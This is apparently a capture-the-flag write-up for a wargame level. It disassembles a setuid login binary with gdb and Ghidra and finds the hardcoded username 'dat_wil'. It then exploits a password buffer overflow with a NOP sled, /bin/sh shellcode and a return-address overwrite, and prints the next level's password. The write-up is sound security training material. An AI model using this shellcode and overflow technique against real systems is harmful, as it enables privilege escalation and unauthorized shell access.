What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level01 level01   80 Sep 13  2016 ./
	dr-x--x--x  1 root    root     260 Oct  2  2016 ../
	-rw-r--r--  1 level01 level01  220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level01 level01 3533 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01*
	-rw-r--r--+ 1 level01 level01   41 Oct 19  2016 .pass
	-rw-r--r--  1 level01 level01  675 Sep 10  2016 .profile

A `level01` binary. Let's check the assembly:

	$ gdb ./level01
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x080484d0 <+0>:     push   %ebp
	0x080484d1 <+1>:     mov    %esp,%ebp
	0x080484d3 <+3>:     push   %edi
	0x080484d4 <+4>:     push   %ebx
	=> 0x080484d5 <+5>:     and    $0xfffffff0,%esp
	0x080484d8 <+8>:     sub    $0x60,%esp
	0x080484db <+11>:    lea    0x1c(%esp),%ebx
	0x080484df <+15>:    mov    $0x0,%eax
	0x080484e4 <+20>:    mov    $0x10,%edx
	0x080484e9 <+25>:    mov    %ebx,%edi
	0x080484eb <+27>:    mov    %edx,%ecx
	0x080484ed <+29>:    rep stos %eax,%es:(%edi)
	0x080484ef <+31>:    movl   $0x0,0x5c(%esp)
	0x080484f7 <+39>:    movl   $0x80486b8,(%esp)
	0x080484fe <+46>:    call   0x8048380 <puts@plt>
	0x08048503 <+51>:    mov    $0x80486df,%eax
	0x08048508 <+56>:    mov    %eax,(%esp)
	0x0804850b <+59>:    call   0x8048360 <printf@plt>
	0x08048510 <+64>:    mov    0x804a020,%eax
	0x08048515 <+69>:    mov    %eax,0x8(%esp)
	0x08048519 <+73>:    movl   $0x100,0x4(%esp)
	0x08048521 <+81>:    movl   $0x804a040,(%esp)
	0x08048528 <+88>:    call   0x8048370 <fgets@plt>
	0x0804852d <+93>:    call   0x8048464 <verify_user_name>
	0x08048532 <+98>:    mov    %eax,0x5c(%esp)
	0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
	0x0804853b <+107>:   je     0x8048550 <main+128>
	0x0804853d <+109>:   movl   $0x80486f0,(%esp)
	0x08048544 <+116>:   call   0x8048380 <puts@plt>
	0x08048549 <+121>:   mov    $0x1,%eax
	0x0804854e <+126>:   jmp    0x80485af <main+223>
	0x08048550 <+128>:   movl   $0x804870d,(%esp)
	0x08048557 <+135>:   call   0x8048380 <puts@plt>
	0x0804855c <+140>:   mov    0x804a020,%eax
	0x08048561 <+145>:   mov    %eax,0x8(%esp)
	0x08048565 <+149>:   movl   $0x64,0x4(%esp)
	0x0804856d <+157>:   lea    0x1c(%esp),%eax
	0x08048571 <+161>:   mov    %eax,(%esp)
	0x08048574 <+164>:   call   0x8048370 <fgets@plt>
	0x08048579 <+169>:   lea    0x1c(%esp),%eax
	0x0804857d <+173>:   mov    %eax,(%esp)
	0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
	0x08048585 <+181>:   mov    %eax,0x5c(%esp)
	0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
	0x0804858e <+190>:   je     0x8048597 <main+199>
	0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)
	0x08048595 <+197>:   je     0x80485aa <main+218>
	0x08048597 <+199>:   movl   $0x804871e,(%esp)
	0x0804859e <+206>:   call   0x8048380 <puts@plt>
	0x080485a3 <+211>:   mov    $0x1,%eax
	0x080485a8 <+216>:   jmp    0x80485af <main+223>
	0x080485aa <+218>:   mov    $0x0,%eax
	0x080485af <+223>:   lea    -0x8(%ebp),%esp
	0x080485b2 <+226>:   pop    %ebx
	0x080485b3 <+227>:   pop    %edi
	0x080485b4 <+228>:   pop    %ebp
	0x080485b5 <+229>:   ret
	End of assembler dump.

	(gdb) info functions
	[...]
	0x08048464  verify_user_name
	0x080484a3  verify_user_pass
	0x080484d0  main
	
	(gdb) disas verify_user_name
	Dump of assembler code for function verify_user_name:
	0x08048464 <+0>:     push   %ebp
	0x08048465 <+1>:     mov    %esp,%ebp
	0x08048467 <+3>:     push   %edi
	0x08048468 <+4>:     push   %esi
	0x08048469 <+5>:     sub    $0x10,%esp
	0x0804846c <+8>:     movl   $0x8048690,(%esp)
	0x08048473 <+15>:    call   0x8048380 <puts@plt>
	0x08048478 <+20>:    mov    $0x804a040,%edx
	0x0804847d <+25>:    mov    $0x80486a8,%eax
	0x08048482 <+30>:    mov    $0x7,%ecx
	0x08048487 <+35>:    mov    %edx,%esi
	0x08048489 <+37>:    mov    %eax,%edi
	0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)
	0x0804848d <+41>:    seta   %dl
	0x08048490 <+44>:    setb   %al
	0x08048493 <+47>:    mov    %edx,%ecx
	0x08048495 <+49>:    sub    %al,%cl
	0x08048497 <+51>:    mov    %ecx,%eax
	0x08048499 <+53>:    movsbl %al,%eax
	0x0804849c <+56>:    add    $0x10,%esp
	0x0804849f <+59>:    pop    %esi
	0x080484a0 <+60>:    pop    %edi
	0x080484a1 <+61>:    pop    %ebp
	0x080484a2 <+62>:    ret
	End of assembler dump.

	(gdb) disas verify_user_pass
	Dump of assembler code for function verify_user_pass:
	0x080484a3 <+0>:     push   %ebp
	0x080484a4 <+1>:     mov    %esp,%ebp
	0x080484a6 <+3>:     push   %edi
	0x080484a7 <+4>:     push   %esi
	0x080484a8 <+5>:     mov    0x8(%ebp),%eax
	0x080484ab <+8>:     mov    %eax,%edx
	0x080484ad <+10>:    mov    $0x80486b0,%eax
	0x080484b2 <+15>:    mov    $0x5,%ecx
	0x080484b7 <+20>:    mov    %edx,%esi
	0x080484b9 <+22>:    mov    %eax,%edi
	0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)
	0x080484bd <+26>:    seta   %dl
	0x080484c0 <+29>:    setb   %al
	0x080484c3 <+32>:    mov    %edx,%ecx
	0x080484c5 <+34>:    sub    %al,%cl
	0x080484c7 <+36>:    mov    %ecx,%eax
	0x080484c9 <+38>:    movsbl %al,%eax
	0x080484cc <+41>:    pop    %esi
	0x080484cd <+42>:    pop    %edi
	0x080484ce <+43>:    pop    %ebp
	0x080484cf <+44>:    ret
	End of assembler dump.

Let's take a look at a cleaned `Ghidra` output:

	char	a_user_name[100];

A global buffer.

	int	main(void)
	{
		int		uVar1;
		int		iVar2;
		char	*pcVar3;
		char	local_54[64];
		int		local_14;
		
		pcVar3 = local_54;
		for (iVar2 = 16; iVar2 != 0; iVar2--)
		{
			pcVar3[0] = '\0';
			pcVar3[1] = '\0';
			pcVar3[2] = '\0';
			pcVar3[3] = '\0';
			pcVar3 = pcVar3 + 4;
		}
		local_14 = 0;
		puts("********* ADMIN LOGIN PROMPT *********");
		printf("Enter Username: ");
		fgets(&a_user_name, 256, stdin);
		local_14 = verify_user_name();
		if (local_14 == 0)
		{
			puts("Enter Password: ");
			fgets(local_54, 100, stdin);
			local_14 = verify_user_pass(local_54);
			if ((local_14 == 0) || (local_14 != 0))
			{
				puts("nope, incorrect password...\n");
				uVar1 = 1;
			}
			else
				uVar1 = 0;
		}
		else
		{
			puts("nope, incorrect username...\n");
			uVar1 = 1;
		}
		return (uVar1);
	}

So, a buffer filled with 0, a `fgets` inside the global variable, a call to `verify_user_name` followed by a `fgets` inside the local buffer and a call to `verify_user_pass` if the username is good.

	int	verify_user_name(void)
	{
		int		iVar1;
		char	*pbVar2;
		char	*pbVar3;
		char	uVar4;
		char	uVar5;
		char	bVar6;
		
		bVar6 = 0;
		puts("verifying username....\n");
		iVar1 = 7;
		pbVar2 = &a_user_name;
		pbVar3 = "dat_wil";
		do
		{
			if (iVar1 == 0)
				break;
			iVar1++;
			uVar4 = *pbVar2 < *pbVar3;
			uVar5 = *pbVar2 == *pbVar3;
			pbVar2++;
			pbVar3++;
		} while ((bool)uVar5);
		return (int)(char)((!(bool)uVar4 && !(bool)uVar5) - uVar4);
	}

A manual `strcmp` between the global variable and `dat_wil`.

	int	verify_user_pass(char *param_1)
	{
		int		iVar1;
		char	*pbVar2;
		char	in_CF;
		char	in_ZF;
		
		iVar1 = 5;
		pbVar2 = "admin";
		do
		{
			if (iVar1 == 0)
				break;
			iVar1--;
			in_CF = *param_1 < *pbVar2;
			in_ZF = *param_1 == *pbVar2;
			param_1++;
			pbVar2++;
		} while ((bool)in_ZF);
		return (int)(char)((!(bool)in_CF && !(bool)in_ZF) - in_CF);
	}

A manual `strcmp` between the string in parameter and `admin`.

There is no call to a shell, so it's time for shellcode. We should be able to overwrite `eip` from the possible local buffer overflow, so let's do it.

The username will be stocked in the 100 char of the global variable, but `dat_wil` is merely 7 char, so we have space to put a shellcode there. We'll take the usual one : `\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80` (https://shell-storm.org/shellcode/files/shellcode-219.html), which is 55 bytes, and add a NOP sled in front, just in case (`\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80`).

The address of the global variable is `0x804a040` + 8 to pass the username = `0x804a048` (`\x48\xa0\x04\x08` in little endian), and the pattern generator for checking the offset (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) gives us 80 for the password (`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac`).

So, `dat_wil\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\n` for username, and `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac\x48\xa0\x04\x08` for password.

	$ (printf 'dat_wil\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\n'; printf 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac\x48\xa0\x04\x08') | ./level01
	********* ADMIN LOGIN PROMPT *********
	Enter Username: verifying username....

	Enter Password:
	nope, incorrect password...

	$ cat /home/users/level02/.pass
	PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
